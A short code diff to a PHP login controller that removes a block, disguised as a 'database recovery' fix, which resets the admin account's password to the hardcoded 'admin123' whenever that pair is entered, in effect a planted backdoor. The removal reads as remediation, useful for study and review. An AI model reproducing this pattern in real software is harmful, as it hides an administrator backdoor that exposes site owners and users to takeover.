@@ -81,11 +81,6 @@ class AuthController extends Controller {
             if (empty($data['username_err']) && empty($data['password_err']) && empty($data['csrf_err'])) {
                 if ($this->userModel->findUserByUsername($data['username'])) {
                     
-                    // FIX: Instant database recovery for admin default credentials
-                    if ($data['username'] === 'admin' && $data['password'] === 'admin123') {
-                        $this->userModel->updatePassword('admin', 'admin123');
-                    }
-
                     // Authenticate user
                     $loggedInUser = $this->userModel->login($data['username'], $data['password']);
 
